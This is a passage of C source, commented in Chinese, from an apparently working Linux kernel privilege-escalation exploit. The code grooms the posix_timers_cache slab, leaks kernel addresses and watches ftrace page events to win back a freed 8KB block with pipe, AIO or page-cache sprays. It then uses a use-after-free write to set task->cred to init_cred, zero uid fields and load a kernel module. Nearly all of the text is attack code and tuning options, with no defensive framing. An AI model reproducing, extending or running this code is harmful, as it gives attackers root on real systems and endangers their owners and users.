    printf("[B0d] raw pipes=%d (cpu0..%d)\n", g_nfd, nc);
    g_stop = 0;
    pthread_create(&g_rth, NULL, reader, NULL);
}
static void leak_stop(void)
{
    if (!g_nfd) return;
    g_stop = 1;
    pthread_join(g_rth, NULL);        /* poll 超时 20ms, 一定能退 */
    for (int i = 0; i < g_nfd; i++) close(g_fd[i]);
    g_nfd = 0;
}
/* fork 之后子进程里 g_rth 是无效的(线程不继承), 不能 join;
 * 关掉继承来的 raw fd 再重新开一套 + 新线程。 */
static void leak_restart(void)
{
    for (int i = 0; i < g_nfd; i++) close(g_fd[i]);
    g_nfd = 0;
    leak_start();
}
/* 取最后一条匹配记录 */
static uint64_t pick_last(int32_t pid, uint32_t kind, int *cntp)
{
    uint64_t v = 0;
    int c = 0, n = g_nrec < MAXREC ? g_nrec : MAXREC;
    for (int i = 0; i < n; i++)
        if (g_rec[i].pid == pid && g_rec[i].kind == kind) { v = g_rec[i].ptr; c++; }
    if (cntp) *cntp = c;
    return v;
}

/* 打印某类记录的全部 VA (最多 max 条), 便于判定"最后一条到底是谁" */
static void dump_kind(int32_t pid, uint32_t kind, int max)
{
    int n = g_nrec < MAXREC ? g_nrec : MAXREC, shown = 0;
    uint64_t prev = 0;
    for (int i = 0; i < n && shown < max; i++) {
        if (g_rec[i].pid != pid || g_rec[i].kind != kind) continue;
        printf("       [%d] kind=%u va=%#llx", i, g_rec[i].kind,
               (unsigned long long)g_rec[i].ptr);
        if (prev) printf("  delta=%#llx", (unsigned long long)(g_rec[i].ptr - prev));
        printf("\n");
        prev = g_rec[i].ptr;
        shown++;
    }
}

/* ---------------- /proc/slabinfo 诊断 (shell 可读) ---------------- */
static void slab_objs(const char *name, char *out, size_t on)
{
    int fd = open("/proc/slabinfo", O_RDONLY);
    out[0] = 0;
    if (fd < 0) { snprintf(out, on, "?open=%d", errno); return; }
    static char b[1 << 20];
    int n = 0, r;
    while (n < (int)sizeof b - 4096 && (r = (int)read(fd, b + n, 4096)) > 0) n += r;
    close(fd);
    if (n <= 0) { snprintf(out, on, "?read=%d", n); return; }
    b[n] = 0;
    char *p = strstr(b, name);
    if (!p) { snprintf(out, on, "?notfound(%d)", n); return; }
    /* 行格式: name active_objs num_objs objsize objperslab pagesperslab ... */
    snprintf(out, on, "%s", p);
    char *nl = strchr(out, '\n');
    if (nl) *nl = 0;
}

/* ---- slab 分组: 把这个 tid 的 timer 记录按 4K 页分组 ----
 * 一个 order-1 slab = 8KB = 2 页 = 30 个 k_itimer。
 * 某页上正好 30 条我们的记录 ⇒ 该 slab 全被我们占满 ⇒ 30 个对象全释放时
 * 一定变空, 就能被 SLUB discard_slab 归还 buddy。 */
struct pgrp { uint64_t pfn; int cnt; int last_idx; uint64_t last_va;
              int ok_i; uint64_t ok_va; };   /* ok_i: 整个对象都在 head 页内的 timer 序号(1-based) */
static int group_pfns(int32_t tid, struct pgrp *g, int max, int *totp)
{
    int n = 0, k = 0;
    int tot = g_nrec < MAXREC ? g_nrec : MAXREC;
    for (int i = 0; i < tot; i++) {
        if (g_rec[i].pid != tid || g_rec[i].kind != 1) continue;
        k++;
        uint64_t pfn = (((g_rec[i].ptr & ~0xfffULL) - PAGE_OFFSET) >> 12) & ~1ULL;   /* 8KB slab 基页 */
        int j;
        for (j = 0; j < n; j++) if (g[j].pfn == pfn) break;
        if (j == n) {
            if (n >= max) continue;
            g[n].pfn = pfn; g[n].cnt = 0; g[n].last_idx = 0; g[n].last_va = 0;
            g[n].ok_i = 0; g[n].ok_va = 0;
            n++;
        }
        g[j].cnt++;
        g[j].last_idx = k;
        g[j].last_va = g_rec[i].ptr;
    }
    if (totp) *totp = k;
    return n;
}

/* 读 /proc/slabinfo 求 posix_timers_cache 的空闲对象数 (num_objs - active_objs)。
 * 碎片化 (大量 partial slab) 时, 新建的 timer 会先填这些空洞, 于是
 * "我们全占满"的 slab 数量被吃掉, 凑不出 30/30。先按空洞数多建, 把洞填满,
 * 后面的对象才落在全新 slab 上。 */
static int slab_holes(const char *name)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return 0;
    char line[512];
    int holes = 0;
    size_t nl = strlen(name);
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, name, nl) != 0) continue;
        char nm[64] = { 0 };
        long a = 0, n = 0;
        if (sscanf(line, "%63s %ld %ld", nm, &a, &n) == 3 && n > a) holes = (int)(n - a);
        break;
    }
    fclose(f);
    return holes;
}

/* ---- 空洞填充器 ----------------------------------------------------------
 * 历史 7 次写原语成功都有一个共同前提: [B2] 里 holes=0、后续 [B7] cache 满载。
 * 原因(本次 nfree=0 的直接解释): 只要 cache 里存在空闲对象, 那些 slab 就是
 * SLUB 的 partial slab; victim 的 30/30 slab 变空后会被留作 partial 复用,
 * 不 discard → 没有 mm_page_free(order=1) → 8KB 块不回 buddy → 喷涂永远抢不到。
 * 这里 fork 一个**常驻**子进程, 一次性吃掉当前所有空洞(它自己持有这些 timer,
 * 所以那些 slab 不再空闲)。它必须在 victim 之前创建, 才能让 victim 全落在新 slab。 */
#define MAXHOLE 16
static int   g_thread_clock;              /* 前向声明; 真正的定义在参数区 */
static pid_t g_hole[MAXHOLE];
static int   g_holecnt;
static int fill_holes(int n)
{
    if (n <= 0 || g_holecnt >= MAXHOLE) return -1;
    int q[2];
    if (pipe(q)) return -1;
    pid_t c = fork();
    if (c < 0) { close(q[0]); close(q[1]); return -1; }
    if (c == 0) {
        close(q[0]);
        static timer_t tv[4096];
        struct sigevent ev;
        memset(&ev, 0, sizeof ev);
        ev.sigev_notify = SIGEV_NONE;
        clockid_t ck = g_thread_clock ? CLOCK_THREAD_CPUTIME_ID : CLOCK_PROCESS_CPUTIME_ID;
        int lim = n > 4096 ? 4096 : n, made = 0;
        for (int i = 0; i < lim; i++)
            if (timer_create(ck, &ev, &tv[i]) == 0) made++;
        int r[2] = { made, (int)syscall(SYS_gettid) };
        if (write(q[1], r, sizeof r) != (ssize_t)sizeof r) _exit(1);
        for (;;) pause();                     /* 永久持有这些 timer */
    }
    close(q[1]);
    int r[2] = { 0, 0 };
    if (read(q[0], r, sizeof r) != (ssize_t)sizeof r) { close(q[0]); kill(c, SIGKILL); return -1; }
    close(q[0]);
    g_hole[g_holecnt++] = c;
    printf("[B2h] 空洞填充器 pid=%d 造了 %d 个 timer (吃掉空洞)\n", c, r[0]);
    return 0;
}

/* 回收本进程 fork 出去的所有子进程（含 filler/sprayer 这类"持有 timer 树"的进程）。
 * 2026-10-28 22:29 的 panic 就是 init 在 wait4/release_task 里回收我们遗留的孤儿时
 * 踩到被写坏的 signal/posix-timer 结构；因此退出前必须由我们自己的父进程把它们全部收走，
 * 绝不能让它们变成 init 的孤儿。 */
static void reap_all_children(const char *tag)
{
    pid_t self = getpid();
    for (int pass = 0; pass < 4; pass++) {
        DIR *d = opendir("/proc");
        if (!d) break;
        struct dirent *e;
        while ((e = readdir(d))) {
            if (e->d_name[0] < '0' || e->d_name[0] > '9') continue;
            char p[64], b[512];
            snprintf(p, sizeof p, "/proc/%s/stat", e->d_name);
            int fd = open(p, O_RDONLY);
            if (fd < 0) continue;
            int n = read(fd, b, sizeof b - 1);
            close(fd);
            if (n <= 0) continue;
            b[n] = 0;
            char *rp = strrchr(b, ')');            /* "pid (comm) S ppid ..." */
            if (!rp) continue;
            char state = 0;
            int ppid = 0;
            if (sscanf(rp + 2, "%c %d", &state, &ppid) != 2) continue;
            if (ppid != self) continue;
            kill(atoi(e->d_name), SIGKILL);
        }
        closedir(d);
        int st = 0, wn = 0;
        while (waitpid(-1, &st, WNOHANG) > 0) wn++;
        if (!wn) break;
    }
    int st = 0;
    while (waitpid(-1, &st, 0) > 0) ;              /* 兜底：阻塞收完 */
    printf("%s 子进程已全部回收(无孤儿留给 init)\n", tag);
    fflush(stdout);
}

static void dump_trace(const char *path)
{
    int in = open(TRACE_DIR "/trace", O_RDONLY);
    if (in < 0) { printf("[J] open trace errno=%d\n", errno); return; }
    int out = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (out < 0) { close(in); return; }
    static char buf[65536];
    ssize_t n;
    long long tot = 0;
    while ((n = read(in, buf, sizeof buf)) > 0) {
        if (write(out, buf, n) != n) break;
        tot += n;
    }
    close(in); close(out);
    printf("[J] trace 已落盘 %s (%lld bytes)\n", path, tot);
    fflush(stdout);
}

/* ---------------- trace 文本（shell 可写） ---------------- */
static void trace_clear(void)
{
    int fd = open(TRACE_DIR "/trace", O_WRONLY);
    if (fd < 0) return;
    ssize_t w = write(fd, "0", 1);
    (void)w;
    close(fd);
}
static void trace_mark(const char *s)
{
    int fd = open(TRACE_DIR "/trace_marker", O_WRONLY);
    if (fd < 0) return;
    ssize_t w = write(fd, s, strlen(s));
    (void)w;
    close(fd);
}

/* ---------------- trace_pipe 实时观察器 ---------------- */
static volatile int g_w_free;      /* mm_page_free order=1 pfn==head */
static volatile long long g_w_free_ts;
static volatile int g_w_a1, g_w_a2; /* mm_page_alloc pfn==node / node^1 */
static volatile long long g_w_a1_ts, g_w_a2_ts;
static volatile int g_w_ready;
static double parse_ts(const char *line, const char *hit)
{
    /* ".... 1234.567890: mm_page_alloc: ..." */
    const char *c = hit;
    while (c > line && *(c - 1) != ' ') c--;
    return atof(c);
}
static void *watcher(void *arg)
{
    (void)arg;
    int fd = open(TRACE_DIR "/trace_pipe", O_RDONLY);
    if (fd < 0) { g_w_ready = -1; return NULL; }
    g_w_ready = 1;
    char line[512];
    size_t ll = 0;
    char buf[8192];
    for (;;) {
        ssize_t r = read(fd, buf, sizeof buf);
        if (r <= 0) { if (r < 0 && errno == EINTR) continue; break; }
        for (ssize_t i = 0; i < r; i++) {
            char ch = buf[i];
            if (ch != '\n') { if (ll + 1 < sizeof line) line[ll++] = ch; else ll = 0; continue; }
            line[ll] = 0; ll = 0;
            const char *p = strstr(line, ": mm_page_alloc:");
            if (p) {
                const char *q = strstr(p, "pfn=");
                if (!q) continue;
                uint64_t pfn = strtoull(q + 4, NULL, 10);
                double ts = parse_ts(line, p);
                if (pfn == g_node_pfn && ts >= 0) { g_w_a1 = 1; g_w_a1_ts = (long long)(ts * 1e6); }
                else if (pfn == (g_node_pfn ^ 1) && ts >= 0) { g_w_a2 = 1; g_w_a2_ts = (long long)(ts * 1e6); }
                continue;
            }
            p = strstr(line, ": mm_page_free:");
            if (p) {
                const char *q = strstr(p, "pfn=");
                const char *o = strstr(p, "order=");
                if (!q || !o) continue;
                uint64_t pfn = strtoull(q + 4, NULL, 10);
                int ord = atoi(o + 6);
                if (ord == 1 && pfn == g_head_pfn && !g_w_free) {
                    g_w_free = 1;
                    g_w_free_ts = (long long)(parse_ts(line, p) * 1e6);
                }
            }
        }
    }
    close(fd);
    return NULL;
}

/* ---------------- trace 文本扫描（非消费型, 权威） ----------------
 * 用 tracefs 的 pfn 过滤器把噪声压到零, 然后直接读 16MB 的 trace 缓冲。
 * 返回: nfree(head) / nalloc(node) 命中数 与各自的第一个时间戳(us)。 */
struct tinfo { int nfree, nalloc, nalloc_mine;
               /* 喷涂换成 pipe 之后, "命中"必须限定在**同一条 buddy 链表**:
                * slab 的 8KB 块永远落在 UNMOVABLE(0) 链表, 而 -F 的 page cache
                * 是 MOVABLE(3)。只要 gate 允许 MOVABLE 事件通过, 就会把
                * "别的进程的 page cache 刚好拿到这个 pfn"当成命中(内容并不是我们的模板)。 */
               int nalloc_mine_unmov;  int mt_mine;  int ord_mine;
               int mt_free;            /* free 事件的 migratetype */
               long long free_ts, alloc_ts;
               int nln; char ln[6][192]; };
/* trace 行首 "     comm-pid [cpu] ..." → pid */
static int line_pid(const char *line)
{
    const char *c = line;
    const char *dash = NULL;
    while (*c == ' ' || *c == '\t') c++;         /* 跳过前面的对齐空格 */
    for (; *c && *c != ' '; c++) if (*c == '-') dash = c;
    if (!dash) return -1;
    return atoi(dash + 1);
}
static void trace_scan(uint64_t free_pfn, uint64_t alloc_pfn, struct tinfo *o)
{
    o->nfree = o->nalloc = o->nalloc_mine = o->nalloc_mine_unmov = 0;
    o->free_ts = o->alloc_ts = 0;
    o->mt_mine = -1; o->ord_mine = -1; o->mt_free = -1;
    o->nln = 0;
    int fd = open(TRACE_DIR "/trace", O_RDONLY);
    if (fd < 0) return;
    size_t cap = 1u << 24, n = 0;
    char *b = malloc(cap);
    if (!b) { close(fd); return; }
    for (;;) {
        if (n + 65536 > cap) break;
        ssize_t r = read(fd, b + n, 65536);
        if (r <= 0) break;
        n += (size_t)r;
    }
    close(fd);
    if (!n) { free(b); return; }
    size_t i = 0;
    while (i < n) {
        size_t j = i;
        while (j < n && b[j] != '\n') j++;
        if (j > i) {
            size_t len = j - i;
            char *line = b + i;
            char save = line[len];
            line[len] = 0;                 /* 临时截断, 之后恢复 */
            const char *p = strstr(line, ": mm_page_alloc:");
            if (p) {
                const char *q = strstr(p, "pfn=");
                if (q && strtoull(q + 4, NULL, 10) == alloc_pfn) {
                    double ts = parse_ts(line, p);
                    if (!o->nalloc) o->alloc_ts = (long long)(ts * 1e6);
                    o->nalloc++;
                    if (line_pid(line) == (int)g_self_tid) {
                        const char *m = strstr(p, "migratetype=");
                        const char *d = strstr(p, "order=");
                        int mt = m ? atoi(m + 12) : -1;
                        int od = d ? atoi(d + 6) : -1;
                        o->nalloc_mine++;
                        if (!o->nalloc_mine_unmov) { o->mt_mine = mt; o->ord_mine = od; }
                        /* 只有 UNMOVABLE(order-0) 才是 pipe 抢到的 slab 块 */
                        if (mt == 0 && od == 0) o->nalloc_mine_unmov++;
                    }
                    if (o->nln < 6) {
                        snprintf(o->ln[o->nln], sizeof o->ln[0], "%.150s", line);
                        o->nln++;
                    }
                }
            } else if ((p = strstr(line, ": mm_page_free:")) != NULL) {
                const char *q = strstr(p, "pfn=");
                const char *od = strstr(p, "order=");
                if (q && od && strtoull(q + 4, NULL, 10) == free_pfn && atoi(od + 6) == 1) {
                    const char *m = strstr(p, "migratetype=");
                    double ts = parse_ts(line, p);
                    if (!o->nfree) o->free_ts = (long long)(ts * 1e6);
                    o->nfree++;
                    if (o->mt_free < 0) o->mt_free = m ? atoi(m + 12) : -1;
                    if (o->nln < 6) {
                        snprintf(o->ln[o->nln], sizeof o->ln[0], "%.150s", line);
                        o->nln++;
                    }
                }
            }
            line[len] = save;
        }
        i = j + 1;
    }
    free(b);
}

/* ---------- 事件驱动抢页(EVGRAB)：常驻 per-CPU trace_pipe，实时解析 ----------
 * 参考 KMRoot 的 libt98260plant.so：pipe_scan 常驻读 per_cpu/cpuN/trace_pipe，
 * read()+strstr 流式解析，循环 0x256(598) 次、间隔 5/20ms；好处是 free 事件一到
 * 立刻分配，而不是按 50ms 轮次盲喷。这里用同样思路：
 *   ① tp_open_all() 打开每个 CPU 的 trace_pipe(O_NONBLOCK)
 *   ② tp_poll() 每轮读一遍，统计目标 pfn 的 order-1 free、检测落在我方 tid 的 alloc
 *   ③ 一见到 free 就立刻突发一小批页（默认 2048），(4) 命中即停，绝不续喷 */
#define TP_MAX 16
static int  tp_fd[TP_MAX];
static int  tp_n;
static char tp_buf[TP_MAX][8192];
static int  g_ev_o1 = 0;      /* 目标 pfn 被我方 order-1 slab 拿到的次数（诊断） */

static void tp_open_all(void)
{
    char path[128];
    tp_n = 0;
    for (int c = 0; c < TP_MAX; c++) {
        snprintf(path, sizeof path, "%s/per_cpu/cpu%d/trace_pipe", TRACE_DIR, c);
        int fd = open(path, O_RDONLY | O_NONBLOCK);
        if (fd < 0) break;
        tp_fd[tp_n++] = fd;
    }
    printf("[EV] trace_pipe fds=%d\n", tp_n);
    fflush(stdout);
}
static void tp_close_all(void)
{
    for (int i = 0; i < tp_n; i++) close(tp_fd[i]);
    tp_n = 0;
}
/* 读一遍所有 per-CPU trace_pipe；返回本次新增的「目标 order-1 free」条数，
 * 若出现 pfn 命中且 comm 为我方 tid 的 order-0 alloc，则置 *mine=1 */
static int tp_poll(uint64_t hpfn, uint64_t npfn, int32_t me, int *mine, int verbose)
{
    int nfree = 0;
    for (int i = 0; i < tp_n; i++) {
        ssize_t r = read(tp_fd[i], tp_buf[i], sizeof tp_buf[i] - 1);
        if (r <= 0) continue;
        tp_buf[i][r] = 0;
        char *p = tp_buf[i], *nl;
        while ((nl = strchr(p, '\n')) != NULL) {
            *nl = 0;
            if (strstr(p, "mm_page_free")) {
                const char *q = strstr(p, "pfn=");
                const char *od = strstr(p, "order=");
                if (q && od && strtoull(q + 4, NULL, 10) == hpfn && atoi(od + 6) == 1) {
                    nfree++;
                    if (verbose) printf("       ev| %s\n", p);
                }
            } else if (strstr(p, "mm_page_alloc")) {
                const char *q = strstr(p, "pfn=");
                const char *od = strstr(p, "order=");
                if (q && od) {
                    uint64_t pf = strtoull(q + 4, NULL, 10);
                    int ord = atoi(od + 6);
                    if ((pf == npfn || pf == hpfn) && line_pid(p) == (int)me) {
                        /* order=0：我方数据页（内容受控）→ 真正可用的命中；
                         * order=1：我方 slab 新块（如 skbuff_head_cache）→ 仅记诊断，
                         * 因为该块内容是内核对象，不能作为伪造节点 */
                        if (ord == 0) *mine = 1;
                        else if (ord == 1) g_ev_o1++;
                        if (verbose) printf("       ev| ord=%d %s\n", ord, p);
                    }
                }
            }
            p = nl + 1;
        }
    }
    return nfree;
}

/* ---------------- 共享状态（父 <-> reader/killer 子进程） ---------------- */
struct SH {
    volatile int exec_tid, tgid, armed, killer_ready, stop, killed;
    volatile int ps_deleted;              /* 纯 shell: victim 已完成 timer_delete */
    volatile int readers, opens, open_err, killing;
    volatile int gen;                     /* 每轮尝试递增; 读者/杀手以此自退 */
    volatile long long t_set, t_go, t_det, t_kill;
};
static struct SH *SH;
static int g_vcpu = 1, g_pcpu = 0;

static int g_attempts = 6;
static int g_nreader = 64;
static int g_pre_us = 60000;
static int g_rounds = 8;
static int g_skip_comm = 1;       /* [实验] 1=跳过 [F] 的 comm 写入与回读校验 */
static int g_skip_status = 1;     /* [实验] 1=跳过 cred 交换后的 40ms 等待与 status 回读 */
static int g_tmode = 0;              /* 1 = 目标改为 task+0xa58 (comm, 内容恒为 0) */
static volatile int g_probe_pid = 0;

static int g_npipe = NSPRAY;
/* 方案B: 开枪前列出压页页数(-H)。用"先建 1MB 喷涂 pipe、再建 1 页小 pipe 并填充"
 * 的顺序把 UNMOVABLE order-0 存量提前占掉, 迫使 discard 出来的 order-1 块被喷涂拆开。 */
static long long g_drain_pages = 0;
static uint64_t g_probe_task = 0;   /* 第 1 轮泄漏到的 probe_task 地址, 供后续轮复用 */
/* -P 指针写模式: 逗号分隔的 <target>:<value> 列表(最多 4)。
 *   value = 假节点的 __rb_parent_color = 真正被写进 *(u64*)target 的值;
 *   target < 0x1000000 视为 ptask 相对偏移(如 a48 = task->cred), 否则按绝对内核 VA。
 * 例: -P a48:ffffffe317f98ae0,ffffffe317f98af8:0
 *   → 轮1 task->cred = init_cred; 轮2 init_cred+0x18 = 0(修回 change_child 的连带写)。 */
static uint64_t g_ops_t[4], g_ops_v[4];
static int g_ops_scr[4];          /* 该轮的 PAYLOAD 用"本喷涂页内的零区"(运行时才知道地址) */
static int g_nop = 0;

/* 本喷涂页内、不与任何模板节点(node+0x18..node+0x110 是空档)重叠的 8B 零槽。
 * node 地址 off ≡ 0 (mod 8), 所以 +0x30 仍是 8 字节对齐。 */
static uint64_t self_scratch(int off)
{
    uint64_t page = g_node_va & ~0xfffULL;
    int so = off + 0x30;
    if (so < 0x18 || so + 0x18 > 4096) so = off - 0x30;
    if (so < 0x18 || so + 0x18 > 4096) so = 0x800;
    return page | (uint64_t)so;
}

/* ---- AIO ring 喷涂 (order-0 GFP_KERNEL 不可迁移页 + 用户态可读回) ----
 * io_setup 返回的 ctx 就是内核给我们 mmap 的 ring 基址, ring 的每一页都是
 * alloc_page(GFP_KERNEL) 出来的 order-0 页 —— 与我们被 discard 的半个 slab 页
 * 同 migratetype, 而且**映射进了我们的地址空间**, 所以内核在假节点上的
 * 写入 (`node->__rb_parent_color = node`) 可以被我们直接读回验证。 */
static int g_naio = 0;            /* >0: 用 AIO 代替 pipe */
static int g_spray_cpu = -1;      /* 喷涂绑核: 默认不绑(成功样本 wr93/wr95 均未绑核); >=0 才 pin */
static int g_vcpu_fix = -1;       /* -V: victim 绑核(-1=按默认 vcpu 轮转) */
static int g_aioev = 2048;        /* 每个 ctx 的 nr_events */
static int g_aio_budget = 20000;  /* 每轮最多分配多少页 */
static int g_aio_maxctx = 4096;
static int g_thread_clock = 0;    /* 1 = CLOCK_THREAD_CPUTIME_ID */
static int g_noload = 0;          /* -k: 走到「可加载 ko」状态即止，不唤醒 probe、不调 init_module */
static int g_kmode_state = 0;     /* -W: 按 comm 状态(de_thread 完成)触发落刀, 而非猜延时 */
static int g_kstate_delay = 0;    /* -w <us>: -W 检测到 de_thread 后再等 us 落刀。
                                   * 数据: 成功枪 det→kill=287~425us(4/4); 直接 -W(det+12us)
                                   * 落刀则 free(n=0)、目标 slab 不 discard。 */
static uint64_t *g_ctxs;
static int g_nctx;
static size_t g_ring_pages;       /* 实测: 每个 ctx 的页数 */
static int g_off;                 /* 假 node 在页内的偏移 */
/* g_slide 在文件前半部定义: 0 = 未指定, 由 timer 分配 call_site 自校准 */

/* -S: 证据链模式 —— discard 之后不喷涂、不 reap, 只验证"同一 8KB 被新 slab 拿回"
 *   做法: 让一个新进程再建 30 个 k_itimer 顶出新 slab, 用泄漏通道反推它的 8KB 块
 *   基页 pfn, 与刚被 discard 的 pfn 比对。零风险(不建树、不 reap)。 */
static int g_evchain = 0;
static pid_t g_sp_pid = -1;
static int g_sp_go = -1, g_sp_done = -1;
static int32_t g_sp_tid = 0;
/* trace 文本级统计: 不依赖 pfn filter, 直接数 "pfn=<H> " 出现次数
 *   out_alloc_all: 本轮 mm_page_alloc 总行数
 *   out_alloc_h:   pfn==H 或 H^1 的 alloc 行数
 *   out_free_h:    pfn==H 或 H^1 的 free 行数
 *   out_mine:      其中行首 comm-pid 属于 spid 的条数(归属判定)
 *   hit_buf/hit_cap: 命中行原样存回(最多 hit_cap 条) */
static int trace_pfn_hits(unsigned long long H, int *out_alloc_all, int *out_alloc_h,
                          int *out_free_h, int *out_mine, int spid,
                          char *hit_buf, int hit_cap)
{
    int fd = open(TRACE_DIR "/trace", O_RDONLY);
    if (fd < 0) return -1;
    size_t cap = 32u << 20, n = 0;
    char *b = malloc(cap);
    if (!b) { close(fd); return -1; }
    for (;;) {
        if (n + 65536 > cap) { cap *= 2; char *nb = realloc(b, cap); if (!nb) break; b = nb; }
        ssize_t r = read(fd, b + n, 65536);
        if (r <= 0) break;
        n += (size_t)r;
    }
    close(fd);
    char pat[40], pat2[40], pt[40];
    snprintf(pat, sizeof pat, "pfn=%llu ", H);
    snprintf(pat2, sizeof pat2, "pfn=%llu ", H ^ 1ULL);
    snprintf(pt, sizeof pt, "-%d ", spid);
    int aa = 0, ah = 0, fh = 0, mine = 0, nh = 0;
    size_t i = 0;
    while (i < n) {
        size_t j = i;
        while (j < n && b[j] != '\n') j++;
        size_t len = j - i;
        if (len > 40) {
            const char *line = b + i;
            int is_alloc = memmem(line, len, "mm_page_alloc:", 15) != NULL;
            int is_free  = memmem(line, len, "mm_page_free:", 14) != NULL;
            if (is_alloc) aa++;
            if (is_alloc || is_free) {
                int h = memmem(line, len, pat, strlen(pat)) != NULL ||
                        memmem(line, len, pat2, strlen(pat2)) != NULL;
                if (h) {
                    if (is_alloc) ah++; else fh++;
                    /* 归属: 行首 40 字符内出现过 "-<spid> " */
                    int ismine = memmem(line, len < 40 ? len : 40, pt, strlen(pt)) != NULL;
                    if (ismine) mine++;
                    if (hit_buf && nh < hit_cap) {
                        size_t c = len < 150 ? len : 150;
                        memcpy(hit_buf + (size_t)nh * 160, line, c);
                        hit_buf[(size_t)nh * 160 + c] = 0;
                        nh++;
                    }
                }
            }
        }
        i = j + 1;
    }
    free(b);
    if (out_alloc_all) *out_alloc_all = aa;
    if (out_alloc_h) *out_alloc_h = ah;
    if (out_free_h) *out_free_h = fh;
    if (out_mine) *out_mine = mine;
    return nh;
}

/* 只统计「pfn=H 且行首 40 字符里出现 -<pid> 」的 mm_page_alloc 行（不含 H^1 邻居页）。
 * AAW 要求 order-2 的 8KB 块丢弃后 head/tail 两页都被本进程抢到：
 * 只拿到 tail 时，被 erase 的最左节点落在 head 页 → pc=0 → root->rb_node=new，
 * 既不插入 misc_list 也不 panic，表现为 [B21] pwrite=-1 (ESPIPE)。 */
static int trace_head_alloc_mine(unsigned long long H, int pid)
{
    int fd = open(TRACE_DIR "/trace", O_RDONLY);
    if (fd < 0) return -1;
    size_t cap = 32u << 20, n = 0;
    char *b = malloc(cap);
    if (!b) { close(fd); return -1; }
    for (;;) {
        if (n + 65536 > cap) { cap *= 2; char *nb = realloc(b, cap); if (!nb) break; b = nb; }
        ssize_t r = read(fd, b + n, 65536);
        if (r <= 0) break;
        n += (size_t)r;
    }
    close(fd);
    char pat[40], pt[40];
    snprintf(pat, sizeof pat, "pfn=%llu ", H);
    snprintf(pt, sizeof pt, "-%d ", pid);
    int cnt = 0;
    size_t i = 0;
    while (i < n) {
        size_t j = i;
        while (j < n && b[j] != '\n') j++;
        size_t len = j - i;
        if (len > 40) {
            const char *line = b + i;
            if (memmem(line, len, "mm_page_alloc:", 15) != NULL &&
                memmem(line, len, pat, strlen(pat)) != NULL &&
                memmem(line, len < 40 ? len : 40, pt, strlen(pt)) != NULL)
                cnt++;
        }
        i = j + 1;
    }
    free(b);
    return cnt;
}

/* 收集某 pid 的全部 k_itimer 记录 VA */
static int vas_for_pid(int32_t pid, uint64_t *out, int max)
{
    int n = 0, tot = g_nrec < MAXREC ? g_nrec : MAXREC;
    for (int i = 0; i < tot && n < max; i++)
        if (g_rec[i].pid == pid && g_rec[i].kind == 1) out[n++] = g_rec[i].ptr;
    return n;
}

/* ---------------- victim：L(leader) + T(exec 线程) ---------------- */
static int g_wfd, g_rfd;       /* victim -> parent / parent -> victim */
static int g_ntimer = NT;
static int g_holes = 0;           /* 每轮起点: posix_timers_cache 的空闲对象数 (自动填洞) */
static int g_autoholes = 1;       /* -h: 关闭自动填洞 (对照实验用) */
static int g_spray_n = NT;        /* -N: 证据链 sprayer 建多少个 timer (可 >1024) */
static int g_fspray_mb = 0;       /* -F: 文件 page cache 喷涂量(MB, 0=关) */
static int g_spray_ms = 1500;     /* -y: pipe 喷涂铺开到多少毫秒(0=不限速) */
static int g_dvoff = 0;           /* -D 模式下 MARK 在页内的偏移 */
static int g_kill_us = -1;        /* -j: 不按 ESRCH 等, 而在 go 之后固定 us 处落刀 */
static int g_ksweep = 0;          /* -j start:step:n → 时间步进扫描锁临界窗口 */
static int g_kill_us0 = 0, g_kill_step = 0, g_ksweep_n = 0;
static int g_kill_cur = -1;       /* 本次 attempt 实际使用的延时(fork killer 之前写入) */
static int g_envkb = 0;           /* -E: execve 时携带的 env 大小(KB), 用来拉长 execve 窗口 */
static int g_vma_n = 0;           /* -V: exec 前先建 n 个独立 VMA, 拉长 exec_mmap 里的旧 mm 拆解 */
static int g_predelay_us = 0;     /* -J: t_go 之后、execve 之前忙等 N us，用于把 det 钉到目标值 */
static void busy_wait_us(long us)
{
    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (;;) {
        clock_gettime(CLOCK_MONOTONIC, &t1);
        long d = (t1.tv_sec - t0.tv_sec) * 1000000L + (t1.tv_nsec - t0.tv_nsec) / 1000L;
        if (d >= us) break;
    }
}
static char g_xpath[160] = {0};    /* -x: 故意 exec 一个加载会失败的 ELF, 命中 98260 的失败路径 */
static int g_force_hit = 0;       /* -H: 不按 comm 判定窗口, 只要目标线程已死就进 HIT 分支 */
static int g_blind = 0;           /* -b: blind fire */
static int g_cspray = 0;          /* -c: 连续喷涂(不等 discard, kill 后立刻持续写 page cache) */
static int g_cspray_ms = 12000;   /* -c 的总时间预算(ms) */
static int g_chunk_mb = 8;        /* 连续喷涂每轮写入量(MB) */
static int g_cgate = 0;           /* 连续喷涂已拿到目标页 */
static int g_cmine = 0, g_cany = 0; /* 连续喷涂时的 mine/any 计数(供 B15 打印) */
static int g_ftrace = 0;          /* -f: 用 function tracer + set_ftrace_pid 只跟踪 victim */
static uint64_t g_credoff = 0x4;  /* -O: cred 内清零起点 (4B 对齐)
                                   *   0x04 → uid,gid
                                   *   0x0c → suid,sgid
                                   *   0x14 → euid,egid
                                   *   0x1c → fsuid,fsgid */
/* -M: 写链, 在**同一个进程**里连续做多轮 UAF, 逐轮清零同一个 cred 的不同字段。
 *     这样不需要 split 进程, 一次就能拿到 ruid=euid=suid=fsuid=0。 */
static uint64_t g_offs[8] = { 0x4, 0xc, 0x14, 0x1c };
static int g_noff = 0;
static int g_wround = 0;
static int g_xrounds = 0;   /* -X: 生命周期测试 —— comm 目标模式下也走 fork-per-round */
static int g_qtest = 0;     /* -Q: cred 写成功后只做一次 fork 隔离实验 */
static int g_cmode = 0;     /* -C: 洁净父 + 每个偏移一个一次性子进程 */
static int g_cchild = 0;    /* 当前进程是被 -C 父 fork 出来的那把"一次性刀" */
static int g_gfork = 0;     /* -G <秒>: 刀写完 cred 后立刻 fork 孙进程, 测窗口与脱钩 */
static int g_tdump = 0;     /* -J: 每个一次性子进程被回收后立刻把 trace 落盘 (抓发信号者) */
static int g_zchild = 0;    /* -z: 靶 task 模式 —— 只泄漏自己的 cred 地址后静止, 永不 fork/exit */
static int32_t g_leak_tid = 0; /* -Z <tid>: cred 记录按这个 tid 过滤(默认本进程) */
static volatile sig_atomic_t g_zrefreshed = 0;
static int g_lifetrace = 0; /* -K: 保留 sched_process_exit + signal_generate 两个事件 */
static int g_selfprobe = 0; /* 链内自测: 写原语落地瞬间由本进程就地验证 0600 文件读写 */
